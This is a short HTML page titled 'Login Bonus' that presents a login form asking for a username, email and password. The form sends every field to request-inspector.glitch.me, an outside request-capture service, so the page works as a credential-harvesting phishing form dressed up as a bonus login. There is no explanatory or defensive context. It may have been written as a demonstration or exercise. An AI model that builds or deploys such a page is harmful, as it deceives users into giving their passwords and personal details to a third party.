<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Bonus</title>
</head>
<body>
<form method="POST" action="https://request-inspector.glitch.me/">
    <p>
        <label class="text" for="username">Username</label>
        <input class="text" id="username" name="username" type="text"
           placeholder="Enter User Name" autofocus="autofocus" required/>
    </p>
    <p>
        <label for="email">Email</label>
        <input id="email" name="email" type="text" placeholder="Enter Email" required/>
    </p>
    <p>
        <label for="password">Password</label>
        <input class="text" id="password" name="password"
               type="password" placeholder="Enter Password" required/>
    </p>
        <input type="checkbox" id="logged_in" name="Logged_in" value="yes" checked>
        <label for="logged_in">Keep me logged in for 2 weeks</label>
    <p>
        <button type="submit">Submit</button>
    </p>
</form>


</body>
</html>
